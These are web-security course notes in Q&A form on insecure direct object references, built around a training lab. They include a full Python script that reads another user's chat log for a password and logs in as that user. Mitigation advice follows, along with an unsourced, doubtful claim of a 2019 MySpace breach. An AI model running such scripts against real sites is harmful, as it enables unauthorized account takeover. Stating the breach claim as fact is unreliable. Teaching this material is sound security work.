---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is an Insecure Direct Object Reference (IDOR) vulnerability?**

An Insecure Direct Object Reference (IDOR) vulnerability occurs when a web application exposes internal objects directly through user-controllable parameters without proper authorization checks. For example, if a web application allows users to access files or database records using predictable identifiers (like filenames or IDs), an attacker can manipulate these identifiers to access unauthorized resources. In the lab, accessing `1.txt` and `2.txt` directly demonstrates this vulnerability since the application does not verify whether the user has permission to view these files.

**Q2. How can you exploit an IDOR vulnerability to gain unauthorized access to sensitive data?**

To exploit an IDOR vulnerability, an attacker needs to identify and manipulate the parameters that reference internal objects. For instance, in the lab, the attacker accessed different chat logs by changing the filename (`1.txt`, `2.txt`). By systematically trying different values, the attacker can discover and access unauthorized resources. Once the attacker identifies a resource containing sensitive data (such as passwords), they can extract and misuse this information.

**Q3. Explain how the Python script provided in the lab exploits the IDOR vulnerability to retrieve Carlos' password.**

The Python script exploits the IDOR vulnerability by performing the following steps:

1. **Initialization**: Import necessary libraries and configure the proxy settings to route requests through Burp Suite.
2. **Retrieve Password**: Define a function `retrieve_carlos_password` that constructs a URL to access Carlos' chat transcript (`1.txt`) and sends a GET request to retrieve the content. The script searches for the string "password" in the response and extracts the password.
3. **Login**: Define a function `carlos_login` that logs in as Carlos using the extracted password. First, it retrieves the CSRF token by sending a GET request to the login page and parsing the response using BeautifulSoup. Then, it constructs a POST request to the `/login` endpoint with the required parameters (CSRF token, username, and password).
4. **Execution**: The main function calls these functions in sequence, first retrieving the password and then logging in as Carlos.

Here is the code snippet for the script:

```python
import requests
import sys
import re
from bs4 import BeautifulSoup
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def retrieve_carlos_password(s, url):
    chat_url = f"{url}/1.txt"
    res = s.get(chat_url, verify=False, proxies=proxies)
    match = re.search(r'password:\s*(\w+)', res.text)
    if match:
        print("Found Carlos's password")
        return match.group(1)
    else:
        print("Could not find Carlos's password")
        sys.exit(-1)

def carlos_login(s, url, password):
    login_url = f"{url}/login"
    csrf_token = get_csrf_token(s, login_url)
    data = {
        'csrf': csrf_token,
        'username': 'carlos',
        'password': password
    }
    res = s.post(login_url, data=data, verify=False, proxies=proxies)
    if 'logout' in res.text:
        print("Successfully logged in as Carlos")
    else:
        print("Could not log in as Carlos")
        sys.exit(-1)

def get_csrf_token(s, url):
    res = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://example.com")
        sys.exit(-1)
    
    url = sys.argv[1].rstrip('/')
    s = requests.Session()
    carlos_password = retrieve_carlos_password(s, url)
    carlos_login(s, url, carlos_password)
```

**Q4. How can you mitigate an IDOR vulnerability in a web application?**

To mitigate an IDOR vulnerability, follow these best practices:

1. **Access Control Checks**: Ensure that every access to internal objects is properly authorized. Verify that the requesting user has the appropriate permissions before allowing access.
2. **Use Non-Predictable Identifiers**: Avoid using simple, sequential identifiers that can be easily guessed. Use unique, non-predictable identifiers such as UUIDs.
3. **Session Management**: Implement strong session management techniques to prevent session hijacking and ensure that only authenticated users can access their respective resources.
4. **Input Validation**: Validate all user inputs to prevent manipulation of object references.
5. **Logging and Monitoring**: Implement logging and monitoring to detect and respond to suspicious activities.

**Q5. Describe a recent real-world example of an IDOR vulnerability and its impact.**

One recent example of an IDOR vulnerability is the breach of the social media platform MySpace in 2019. The vulnerability allowed attackers to access private messages and personal information of users by manipulating the message IDs in the URL. This exposed sensitive data of millions of users, leading to potential identity theft and privacy violations. The impact included reputational damage and legal consequences for MySpace.

---
<!-- nav -->
[[03-Understanding Access Control Vulnerabilities|Understanding Access Control Vulnerabilities]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/12-Lab 11 Insecure direct object references/00-Overview|Overview]]
